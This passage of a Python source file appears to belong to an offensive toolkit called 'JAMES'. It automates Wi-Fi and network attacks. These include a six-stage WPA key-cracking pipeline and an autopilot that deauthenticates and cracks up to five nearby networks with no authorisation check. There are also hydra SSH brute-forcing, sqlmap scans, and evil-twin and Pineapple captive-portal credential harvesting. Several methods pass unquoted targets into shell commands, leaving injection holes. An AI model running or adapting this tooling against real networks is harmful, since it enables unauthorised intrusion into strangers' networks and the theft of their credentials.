          2. aircrack-ng (straight wordlist — fastest)
          3. hashcat WiFi-enhanced (JAMES rules → mask → cascading)
          4. John the Ripper
          5. JAMES generated wifi-common wordlist
          6. JAMES numeric wordlist
        Auto-resolves prerequisites before starting.
        """
        # Auto-resolve prerequisites
        wordlist = self.ensure_wordlist(wordlist)
        capture = self.ensure_capture_file(capture)

        self._print("━" * 50)
        self._print("🔓 SMART WPA CRACK (Enhanced Pipeline)")
        self._print("━" * 50)

        entry = self._log(
            "crack_wpa_smart",
            "multi",
            {
                "capture": capture,
                "wordlist": wordlist,
                "bssid": bssid,
                "ssid": ssid,
            },
        )

        # Try to discover SSID from capture if not provided
        if not ssid and bssid:
            try:
                # Extract SSID from capture file using aircrack
                result = self.layer.run(
                    f"aircrack-ng {capture} 2>/dev/null | grep -i '{bssid}' | awk '{{print $3}}'",
                    timeout=10,
                )
                extracted = result.stdout.strip()
                if extracted and extracted not in ("", "(not", "N/A"):
                    ssid = extracted
                    self._print(f"  📡 Detected SSID: {ssid}")
            except Exception as e:
                logger.debug("SSID extraction failed: %s", e)

        # Stage 1: SSID-targeted wordlist
        if ssid:
            self._print(f"\n[1/6] SSID-targeted wordlist for '{ssid}'...")
            try:
                from james.wordlists.generator import WifiWordlistGenerator

                gen = WifiWordlistGenerator()
                ssid_list = gen.generate_ssid_targeted(ssid)
                size = Path(ssid_list).stat().st_size
                count = size // 10
                self._print(f"  Generated {size:,} bytes of SSID-specific candidates (~{count:,} lines)")
                ac_result = self.aircrack.crack_wpa(capture, ssid_list, bssid=bssid)
                if ac_result.get("found"):
                    self._print(
                        f"  🔑 Cracked via SSID-targeted list: {ac_result['key']}"
                    )
                    self.cache_cracked_key(
                        bssid or capture,
                        ac_result["key"],
                        method="ssid-targeted",
                    )
                    self._finish(entry, ac_result)
                    return ac_result
            except Exception as e:
                self._print(f"  ⚠️ SSID-targeted stage: {e}")
        else:
            self._print("\n[1/6] SSID-targeted — skipped (SSID unknown)")

        # Stage 2: aircrack-ng straight wordlist (fastest engine)
        self._print("\n[2/6] aircrack-ng (straight wordlist)...")
        ac_result = self.aircrack.crack_wpa(capture, wordlist, bssid=bssid)
        if ac_result.get("found"):
            self._print(f"  🔑 Cracked: {ac_result['key']}")
            self.cache_cracked_key(
                bssid or capture, ac_result["key"], method="aircrack"
            )
            self._finish(entry, ac_result)
            return ac_result

        # Stage 3: Hashcat WiFi-enhanced (JAMES rules → mask → cascading)
        self._print("\n[3/6] Hashcat WiFi-enhanced pipeline...")
        hc_file = "/tmp/james_smart_wpa.hc22000"
        self.layer.run(f"rm -f {shlex.quote(hc_file)}")
        conv = self.hcxtools.extract_hashes(capture, hc_file)
        if conv.get("success"):
            hc_result = self.hashcat.crack_wifi_enhanced(
                hc_file,
                wordlist,
                hash_mode=22000,
                ssid=ssid or "",
                timeout_per_stage=300,
            )
            if hc_result.get("found"):
                stage = hc_result.get("winning_stage", "hashcat")
                for k in hc_result.get("cracked_keys", []):
                    self._print(f"  🔑 Cracked ({stage}): {k['plain']}")
                    self.cache_cracked_key(
                        bssid or capture, k["plain"], method=f"hashcat-{stage}"
                    )
                self._finish(entry, hc_result)
                return hc_result
            self._print(
                f"  Stages tried: {', '.join(hc_result.get('stages_tried', []))}"
            )

        # Stage 4: John the Ripper
        self._print("\n[4/6] John the Ripper...")
        john_result = self.john.crack(
            capture, wordlist=wordlist, fmt="wpapsk", timeout=300
        )
        if john_result.get("success"):
            show = self.john.show(capture)
            if ":" in show["output"]:
                for line in show["output"].splitlines():
                    parts = line.split(":", 1)
                    if len(parts) == 2 and parts[1].strip():
                        self._print(f"  🔑 Cracked: {parts[1].strip()}")
                        self.cache_cracked_key(
                            bssid or capture, parts[1].strip(), method="john"
                        )
                        result = {
                            "found": True,
                            "key": parts[1].strip(),
                            "engine": "john",
                        }
                        self._finish(entry, result)
                        return result

        # Stage 5: JAMES generated wifi-common wordlist
        self._print("\n[5/6] JAMES Wi-Fi common wordlist...")
        try:
            from james.wordlists.generator import WifiWordlistGenerator

            gen = WifiWordlistGenerator()
            wifi_common = gen.generate_wifi_common()
            size = Path(wifi_common).stat().st_size
            count = size // 10
            self._print(f"  Generated {size:,} bytes of common Wi-Fi candidates (~{count:,} lines)")
            ac_result = self.aircrack.crack_wpa(capture, wifi_common, bssid=bssid)
            if ac_result.get("found"):
                self._print(f"  🔑 Cracked: {ac_result['key']}")
                self.cache_cracked_key(
                    bssid or capture, ac_result["key"], method="wifi-common"
                )
                self._finish(entry, ac_result)
                return ac_result
        except Exception as e:
            self._print(f"  ⚠️ {e}")

        # Stage 6: Numeric-only wordlist
        self._print("\n[6/6] Numeric PIN patterns...")
        try:
            from james.wordlists.generator import WifiWordlistGenerator

            gen = WifiWordlistGenerator()
            numeric_list = gen.generate_numeric()
            size = Path(numeric_list).stat().st_size
            count = size // 10
            self._print(f"  Generated {size:,} bytes of numeric candidates (~{count:,} lines)")
            ac_result = self.aircrack.crack_wpa(capture, numeric_list, bssid=bssid)
            if ac_result.get("found"):
                self._print(f"  🔑 Cracked: {ac_result['key']}")
                self.cache_cracked_key(
                    bssid or capture, ac_result["key"], method="numeric"
                )
                self._finish(entry, ac_result)
                return ac_result
        except Exception as e:
            self._print(f"  ⚠️ {e}")

        self._print("\n🔒 All 6 stages exhausted.")
        result = {"found": False, "key": "", "stages_tried": 6}
        self._finish(entry, result)
        return result

    # ── task log internals ──────────────────────────────────────

    def _log(self, action: str, tool: str, params: dict) -> TaskEntry:
        entry = TaskEntry(action, tool, params)
        entry.status = "running"
        self.task_log.append(entry)
        # Evict oldest entries to prevent unbounded memory growth
        if len(self.task_log) > self.MAX_LOG:
            self.task_log = self.task_log[-self.MAX_LOG :]
        if self.on_task_update:
            self.on_task_update(entry)
        logger.info("[task] %s → %s %s", action, tool, params)
        return entry

    def _finish(self, entry: TaskEntry, result) -> None:
        entry.result = result
        entry.status = (
            "done" if not (isinstance(result, dict) and "error" in result) else "error"
        )
        if self.on_task_update:
            self.on_task_update(entry)

    def export_log(self) -> list[dict]:
        return [e.as_dict() for e in self.task_log]

    # ── save_cracked_key alias ───────────────────────────────────

    def save_cracked_key(
        self,
        bssid_or_id: str,
        key: str,
        method: str = "unknown",
        essid: str = "",
    ):
        """Alias for cache_cracked_key for backward compatibility."""
        return self.cache_cracked_key(bssid_or_id, key, method, essid)

    # ── wordlist generation ──────────────────────────────────────

    def generate_wifi_wordlists(self, ssid: str = "") -> dict:
        """
        Generate Wi-Fi optimised wordlists using the built-in generator.
        Outputs to ~/.james/wordlists/.
        """
        try:
            from james.wordlists.generator import WifiWordlistGenerator

            gen = WifiWordlistGenerator()
            files: list[str] = []

            self._print("📝 Generating Wi-Fi wordlists...")
            common = gen.generate_wifi_common()
            files.append(common)
            self._print(f"  ✓ wifi_common.txt")

            numeric = gen.generate_numeric()
            files.append(numeric)
            self._print(f"  ✓ wifi_numeric.txt")

            if ssid:
                targeted = gen.generate_ssid_targeted(ssid)
                files.append(targeted)
                self._print(f"  ✓ ssid_{ssid}.txt")

            self._print("✅ Wordlist generation complete.")
            return {"success": True, "files": files}
        except Exception as e:
            logger.warning("Wordlist generation failed: %s", e)
            return {"success": False, "error": str(e)}

    # ── network discovery ────────────────────────────────────────

    def arp_discover(self, interface: str = "") -> dict:
        """ARP sweep the local network to discover live hosts."""
        entry = self._log("arp_discover", "arp-scan", {"interface": interface})
        if not interface:
            iface_r = self.layer.run(
                "ip route get 8.8.8.8 2>/dev/null | awk '{print $5; exit}'",
                timeout=5,
            )
            interface = iface_r.stdout.strip() or "eth0"

        cmd = f"arp-scan --localnet -I {interface} 2>/dev/null"
        result = self.layer.run(cmd, sudo=True, timeout=30)

        # Fall back to netdiscover if arp-scan is unavailable
        if result.returncode != 0 or not result.stdout.strip():
            cmd = f"netdiscover -i {interface} -P -N -r 192.168.0.0/16 2>/dev/null"
            result = self.layer.run(cmd, sudo=True, timeout=30)

        hosts: list[dict] = []
        for line in result.stdout.splitlines():
            # arp-scan: "192.168.1.1  aa:bb:cc  Vendor"
            m = re.match(
                r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]{17})\s*(.*)",
                line.strip(),
            )
            if m:
                hosts.append(
                    {
                        "ip": m.group(1),
                        "mac": m.group(2),
                        "vendor": m.group(3).strip(),
                    }
                )

        result_dict = {"hosts": hosts, "count": len(hosts)}
        self._finish(entry, result_dict)
        return result_dict

    # ── web attack methods ───────────────────────────────────────

    def nikto_scan(self, target: str) -> dict:
        """Run nikto web vulnerability scanner."""
        entry = self._log("nikto_scan", "nikto", {"target": target})
        # Ensure URL has a scheme
        if not target.startswith("http"):
            target = f"http://{target}"
        cmd = f"nikto -host {target} -nointeractive -maxtime 120s 2>/dev/null"
        result = self.layer.run(cmd, timeout=150)
        vulnerabilities: list[str] = []
        server_info = ""
        for line in result.stdout.splitlines():
            stripped = line.strip()
            if stripped.startswith("+ Server:"):
                server_info = stripped[9:].strip()
            elif (
                stripped.startswith("+ ")
                and "OSVDB" in stripped
                or (stripped.startswith("+") and "vulnerable" in stripped.lower())
            ):
                vulnerabilities.append(stripped.lstrip("+ "))
            elif stripped.startswith("+") and any(
                x in stripped
                for x in [
                    "Retrieved",
                    "Uncommon",
                    "Cookie",
                    "GET /",
                    "OPTIONS",
                    "OSVDB",
                ]
            ):
                vulnerabilities.append(stripped.lstrip("+ "))
        res = {
            "target": target,
            "server_info": server_info,
            "vulnerabilities": vulnerabilities,
            "vuln_count": len(vulnerabilities),
            "output": result.stdout[-3000:],
        }
        self._finish(entry, res)
        return res

    def smb_enum(self, target: str) -> dict:
        """Enumerate SMB shares and users via enum4linux."""
        entry = self._log("smb_enum", "enum4linux", {"target": target})
        cmd = f"enum4linux -a {target} 2>/dev/null"
        result = self.layer.run(cmd, timeout=120)
        shares: list[dict] = []
        users: list[str] = []
        os_info = ""
        for line in result.stdout.splitlines():
            stripped = line.strip()
            # Shares: lines like "//TARGET/share  Disk  comment"
            m = re.match(r"//\S+/(\S+)\s+(Disk|Printer|IPC)\s*(.*)", stripped)
            if m:
                shares.append({"name": m.group(1), "type": m.group(2)})
            # Users: lines like "user:[username] rid:[...]"
            m2 = re.search(r"user:\[([^\]]+)\]", stripped)
            if m2:
                users.append(m2.group(1))
            if "OS:" in stripped or "os:" in stripped:
                m3 = re.search(r"OS:\s*(.+)", stripped, re.I)
                if m3 and not os_info:
                    os_info = m3.group(1).strip()
        res = {
            "target": target,
            "shares": shares,
            "share_count": len(shares),
            "users": list(set(users)),
            "user_count": len(set(users)),
            "os_info": os_info,
            "output": result.stdout[-3000:],
        }
        self._finish(entry, res)
        return res

    def dns_lookup(self, domain: str, record_type: str = "ANY") -> dict:
        """DNS record lookup via dig."""
        entry = self._log(
            "dns_lookup", "dig", {"domain": domain, "record_type": record_type}
        )
        cmd = f"dig {domain} {record_type} +noall +answer 2>/dev/null"
        result = self.layer.run(cmd, timeout=15)
        records = [
            line.strip()
            for line in result.stdout.splitlines()
            if line.strip() and not line.startswith(";") and not line.startswith("\t;")
        ]
        res = {
            "domain": domain,
            "record_type": record_type,
            "records": records,
            "count": len(records),
        }
        self._finish(entry, res)
        return res

    def dir_bust(self, url: str, wordlist: Optional[str] = None) -> dict:
        """Directory brute-force via gobuster."""
        entry = self._log("dir_bust", "gobuster", {"url": url})
        if not url.startswith("http"):
            url = f"http://{url}"
        wl = wordlist or self.find_wordlist("web")
        if not wl:
            # Fall back to a tiny built-in list
            wl = "/usr/share/wordlists/dirb/common.txt"
        cmd = f"gobuster dir -u {url} -w {wl} " f"-q --no-error -t 20 2>/dev/null"
        result = self.layer.run(cmd, timeout=180)
        findings: list[dict] = []
        for line in result.stdout.splitlines():
            # gobuster: "/path  (Status: 200) [Size: 1234]"
            m = re.search(r"(/\S*)\s+\(Status:\s*(\d+)\)\s*\[Size:\s*(\d+)\]", line)
            if m:
                findings.append(
                    {
                        "path": m.group(1),
                        "status": m.group(2),
                        "size": m.group(3),
                    }
                )
        res = {
            "url": url,
            "findings": findings,
            "total": len(findings),
            "output": result.stdout[-3000:],
        }
        self._finish(entry, res)
        return res

    def sqli_scan(self, url: str) -> dict:
        """SQL injection scan via sqlmap."""
        entry = self._log("sqli_scan", "sqlmap", {"url": url})
        if not url.startswith("http"):
            url = f"http://{url}"
        cmd = (
            f"sqlmap -u {url} --batch --level=1 --risk=1 "
            f"--timeout=10 --output-dir=/tmp/james_sqlmap 2>/dev/null"
        )
        result = self.layer.run(cmd, timeout=120)
        injectable = False
        vulnerabilities: list[str] = []
        for line in result.stdout.splitlines():
            stripped = line.strip()
            if (
                "is vulnerable" in stripped
                or "parameter" in stripped.lower()
                and "injectable" in stripped.lower()
            ):
                injectable = True
            if "Type:" in stripped or "Title:" in stripped or "Payload:" in stripped:
                vulnerabilities.append(stripped)
        res = {
            "url": url,
            "injectable": injectable,
            "vulnerabilities": vulnerabilities,
            "vuln_count": len(vulnerabilities),
            "output": result.stdout[-3000:],
        }
        self._finish(entry, res)
        return res

    def brute_service(
        self, target: str, proto: str = "ssh", username: str = "admin"
    ) -> dict:
        """Hydra brute-force against a network service."""
        entry = self._log(
            "brute_service",
            "hydra",
            {"target": target, "proto": proto, "username": username},
        )
        wordlist = self.find_wordlist("password")
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt"
        cmd = (
            f"hydra -l {username} -P {wordlist} "
            f"-t 4 -f -q {target} {proto} 2>/dev/null"
        )
        result = self.layer.run(cmd, timeout=300)
        credentials: list[dict] = []
        found = False
        for line in result.stdout.splitlines():
            # hydra: "[22][ssh] host: ... login: ... password: ..."
            m = re.search(
                r"\[\S+\]\[\S+\]\s+host:\s*(\S+)\s+login:\s*(\S+)\s+password:\s*(\S+)",
                line,
            )
            if m:
                found = True
                credentials.append(
                    {
                        "host": m.group(1),
                        "login": m.group(2),
                        "password": m.group(3),
                    }
                )
        res = {
            "target": target,
            "proto": proto,
            "found": found,
            "credentials": credentials,
            "output": result.stdout[-2000:],
        }
        self._finish(entry, res)
        return res

    # ── skills system ────────────────────────────────────────────

    def list_skills(self) -> list[str]:
        """Return names of all available JSON skills."""
        if not SKILLS_DIR.exists():
            return []
        return [p.stem for p in sorted(SKILLS_DIR.glob("*.json")) if p.is_file()]

    def load_skill(self, name: str) -> dict:
        """Load a skill definition by name (without .json extension)."""
        skill_file = SKILLS_DIR / f"{name}.json"
        if not skill_file.exists():
            return {"error": f"Skill '{name}' not found in {SKILLS_DIR}"}
        try:
            return json.loads(skill_file.read_text())
        except json.JSONDecodeError as e:
            return {"error": f"Failed to parse skill '{name}': {e}"}

    def execute_skill_steps(self, skill: dict, context: dict) -> dict:
        """
        Execute a skill's steps sequentially.

        Each step has the form:
          {"action": "<orchestrator_method>", "params": {"key": "{{var}}", ...}}

        Template variables {{var}} are resolved from *context*.
        Results are accumulated and returned.
        """
        name = skill.get("name", "unnamed")
        steps = skill.get("steps", [])
        total = len(steps)
        results: list[dict] = []

        self._print(f"\n{'━' * 50}")
        self._print(f"⚡ Skill: {name} ({total} steps)")
        self._print(f"{'━' * 50}")

        for i, step in enumerate(steps, start=1):
            action = step.get("action", "")
            raw_params = step.get("params", {})
            description = step.get("description", action)

            # Resolve template variables
            params: dict = {}
            for k, v in raw_params.items():
                if isinstance(v, str):
                    resolved = _TEMPLATE_VAR_RE.sub(
                        lambda m: str(context.get(m.group(1), m.group(0))), v
                    )
                    params[k] = resolved
                else:
                    params[k] = v

            self._emit_progress(description, i, total)
            self._print(f"\n[{i}/{total}] {description}")

            method = getattr(self, action, None)
            if method is None:
                self._print(f"  ⚠️ Unknown action: {action}")
                results.append({"step": i, "action": action, "error": "unknown action"})
                continue
            try:
                result = method(**params)
                results.append({"step": i, "action": action, "result": result})
                if isinstance(result, dict) and result.get("error"):
                    self._print(f"  ⚠️ {result['error']}")
                else:
                    self._print(f"  ✅ Done")
            except Exception as e:
                logger.exception("Skill step %d failed: %s", i, e)
                self._print(f"  ❌ Failed: {e}")
                results.append({"step": i, "action": action, "error": str(e)})

        self._print(f"\n{'━' * 50}")
        self._print(f"✅ Skill '{name}' complete")
        self._print(f"{'━' * 50}")
        return {"skill": name, "steps_run": len(results), "results": results}

    # ── auto-pwn pipelines ───────────────────────────────────────

    def auto_wifi_pwn(self, interface: str, wordlist: str) -> dict:
        """
        Fully autonomous Wi-Fi attack pipeline:
          1. Generate wordlists
          2. Scan nearby WPA APs
          3. For each (up to 5): PMKID capture → Deauth + handshake → 6-stage crack
        """
        import time
        import glob
        import tempfile

        self._print("━" * 50)
        self._print("🤖 AUTOPILOT — Autonomous Wi-Fi Attack")
        self._print("━" * 50)

        # Step 1: Wordlist generation
        self._emit_progress("Generating wordlists", 1, 4)
        self._print("\n[1/4] Generating Wi-Fi wordlists...")
        self.generate_wifi_wordlists()

        # Step 2: Monitor mode
        self._emit_progress("Enabling monitor mode", 2, 4)
        self._print("\n[2/4] Enabling monitor mode...")
        try:
            mon_iface = self.ensure_monitor_mode(interface)
        except RuntimeError as e:
            self._print(f"  ❌ {e}")
            return {"success": False, "error": str(e)}

        # Step 3: Scan APs
        self._emit_progress("Scanning for WPA APs", 3, 4)
        self._print("\n[3/4] Scanning nearby WPA APs (15s)...")
        ap_result = self.scan_nearby_aps(mon_iface, duration=15)
        wpa_aps = [
            ap
            for ap in ap_result.get("aps", [])
            if "WPA" in ap.get("privacy", "").upper()
        ]
        if not wpa_aps:
            self._print("  ⚠ No WPA APs found.")
            return {"success": False, "error": "No WPA APs found"}

        self._print(f"  Found {len(wpa_aps)} WPA AP(s). Attacking top 5...")
        cracked: list[dict] = []

        # Step 4: Attack each AP
        self._emit_progress("Attacking APs", 4, 4)
        for ap in wpa_aps[:5]:
            bssid = ap["bssid"]
            essid = ap.get("essid", "")
            channel = str(ap.get("channel", ""))

            # Check cache first
            cached = self.get_cached_key(bssid)
            if cached:
                self._print(f"  🔑 {essid} ({bssid}) — already cracked: {cached}")
                cracked.append({"bssid": bssid, "essid": essid, "key": cached})
                continue

            self._print(f"\n  🎯 Attacking {essid} ({bssid}) ch {channel}")

            # PMKID attempt
            self._print("    [PMKID] Capturing...")
            with tempfile.TemporaryDirectory() as td:
                pcapng = f"{td}/james_pmkid.pcapng"
                hash_file = f"{td}/james_pmkid.hc22000"
                self.hcxtools.capture_pmkid(mon_iface, pcapng, timeout=60)
                conv = self.hcxtools.extract_hashes(pcapng, hash_file)
                if conv.get("success"):
                    self._print("    [PMKID] Hashes extracted — cracking...")
                    hc_result = self.hashcat.crack(hash_file, wordlist, hash_mode=22000)
                    if hc_result.get("success") and hc_result.get("output"):
                        # Try to extract cracked key
                        for line in hc_result["output"].splitlines():
                            if ":" in line:
                                key = line.split(":")[-1].strip()
                                if key:
                                    self._print(f"    🔑 PMKID cracked: {key}")
                                    self.cache_cracked_key(
                                        bssid, key, method="pmkid", essid=essid
                                    )
                                    cracked.append(
                                        {
                                            "bssid": bssid,
                                            "essid": essid,
                                            "key": key,
                                        }
                                    )
                                    break
                        if cracked and cracked[-1].get("bssid") == bssid:
                            continue

            # Handshake fallback
            self._print("    [Handshake] Capturing (25s)...")
            cap_prefix = f"/tmp/james_auto_{bssid.replace(':', '')}"
            self.layer.run(f"rm -f {shlex.quote(cap_prefix)}*")
            proc = self.aircrack.start_airodump(
                mon_iface, bssid=bssid, write_prefix=cap_prefix
            )
            time.sleep(5)
            self.aircrack.deauth(mon_iface, bssid, count=10)
            time.sleep(15)
            self.aircrack.deauth(mon_iface, bssid, count=5)
            time.sleep(5)
            self.layer.kill_background(proc)

            cap_file = f"{cap_prefix}-01.cap"
            if glob.glob(f"{cap_prefix}*.cap"):
                cap_file = sorted(glob.glob(f"{cap_prefix}*.cap"))[0]
                if self.aircrack.check_handshake(cap_file, bssid):
                    self._print("    [Handshake] ✅ Captured — cracking...")
                    res = self.crack_wpa_smart(
                        cap_file, wordlist, bssid=bssid, ssid=essid
                    )
                    if res.get("found"):
                        cracked.append(
                            {"bssid": bssid, "essid": essid, "key": res["key"]}
                        )
                        continue
            self._print(f"    ❌ No crack for {essid}")

        summary = {
            "success": len(cracked) > 0,
            "cracked_count": len(cracked),
            "cracked": cracked,
        }
        self._print(f"\n🏁 AUTOPILOT done — {len(cracked)} network(s) cracked.")
        return summary

    def auto_install_deps(self) -> dict:
        """Auto-install missing pentesting tools."""
        self._print("━" * 50)
        self._print("🔧 Auto-installing dependencies...")
        self._print("━" * 50)
        script = Path(__file__).resolve().parent.parent.parent / "install_deps.sh"
        if script.exists():
            cmd = f"bash {script}"
        else:
            # Inline minimal install
            packages = (
                "aircrack-ng hashcat john nmap hydra nikto gobuster "
                "hcxtools hcxdumptool reaver bully masscan responder "
                "enum4linux smbclient sqlmap sslscan wafw00f ettercap-graphical"
            )
            cmd = f"apt-get install -y {packages}"
        result = self.layer.run(cmd, sudo=True, timeout=600)
        self._print(result.stdout[-2000:])
        return {
            "success": result.returncode == 0,
            "output": result.stdout[-2000:],
        }

    # ── one-click attack chains ──────────────────────────────────

    def oneclick_wifi_blitz(self, interface: str, wordlist: str) -> dict:
        """PMKID + Handshake + WPS — all Wi-Fi attack vectors simultaneously."""
        self._print("━" * 50)
        self._print("💥 Wi-Fi BLITZ — All Vectors")
        self._print("━" * 50)
        return self.auto_wifi_pwn(interface, wordlist)

    def oneclick_network_dominate(self, target: str) -> dict:
        """Scan → fingerprint → brute-force → vuln-check a network range."""
        self._print("━" * 50)
        self._print(f"👑 NETWORK DOMINATE — {target}")
        self._print("━" * 50)
        results: dict = {}

        self._emit_progress("Port scan", 1, 4)
        self._print("\n[1/4] Full port scan...")
        results["scan"] = self.full_scan(target)

        self._emit_progress("ARP discover", 2, 4)
        self._print("\n[2/4] ARP discovery...")
        results["arp"] = self.arp_discover()

        self._emit_progress("SMB enum", 3, 4)
        self._print("\n[3/4] SMB enumeration...")
        results["smb"] = self.smb_enum(target)

        self._emit_progress("Brute-force", 4, 4)
        self._print("\n[4/4] Brute-forcing SSH...")
        results["brute"] = self.brute_service(target, "ssh")

        self._print("\n🏁 Network dominate complete.")
        return results

    def oneclick_web_pwn(self, url: str) -> dict:
        """WAF → DirBust → SQLi → SSL → Nikto full web attack chain."""
        self._print("━" * 50)
        self._print(f"🌐 WEB PWN — {url}")
        self._print("━" * 50)
        results: dict = {}

        self._emit_progress("WAF detection", 1, 4)
        self._print("\n[1/4] WAF detection...")
        results["waf"] = self.wafdetect.detect(url)

        self._emit_progress("Directory bust", 2, 4)
        self._print("\n[2/4] Directory brute-force...")
        results["dirs"] = self.dir_bust(url)

        self._emit_progress("SQLi scan", 3, 4)
        self._print("\n[3/4] SQL injection scan...")
        results["sqli"] = self.sqli_scan(url)

        self._emit_progress("Nikto scan", 4, 4)
        self._print("\n[4/4] Nikto web scan...")
        results["nikto"] = self.nikto_scan(url)

        self._print("\n🏁 Web pwn complete.")
        return results

    def oneclick_stealth_recon(self, target: str) -> dict:
        """OSINT → DNS → WHOIS → passive scan (low noise)."""
        self._print("━" * 50)
        self._print(f"🕵️ STEALTH RECON — {target}")
        self._print("━" * 50)
        results: dict = {}

        self._emit_progress("OSINT harvest", 1, 4)
        self._print("\n[1/4] OSINT harvest...")
        results["osint"] = self.harvester.harvest(target)

        self._emit_progress("DNS enum", 2, 4)
        self._print("\n[2/4] DNS enumeration...")
        results["dns"] = self.dns_lookup(target, "ANY")

        self._emit_progress("WHOIS", 3, 4)
        self._print("\n[3/4] WHOIS lookup...")
        whois_r = self.layer.run(
            f"whois {shlex.quote(target)} 2>/dev/null | head -40", timeout=15
        )
        results["whois"] = {"output": whois_r.stdout[:2000]}

        self._emit_progress("Passive nmap", 4, 4)
        self._print("\n[4/4] Passive nmap scan (no ping, no SYN)...")
        results["scan"] = self.nmap.quick_scan(target)

        self._print("\n🏁 Stealth recon complete.")
        return results

    def oneclick_evil_twin(
        self, interface: str, bssid: str = "", ssid: str = "", channel: int = 6
    ) -> dict:
        """Launch a rogue AP clone with captive portal credential capture."""
        self._print("━" * 50)
        self._print("😈 EVIL TWIN — Rogue AP Attack")
        self._print("━" * 50)
        result = self.pineap.start_evil_twin(
            interface,
            bssid=bssid,
            ssid=ssid,
            channel=channel,
        )
        return result

    def oneclick_pineapple(self, interface: str, portal: str = "default") -> dict:
        """Full Pineapple campaign: scan → karma → portal → harvest."""
        self._print("━" * 50)
        self._print("🍍 PINEAPPLE CAMPAIGN")
        self._print("━" * 50)
        return self.pineap.start_full_campaign(interface, portal=portal)
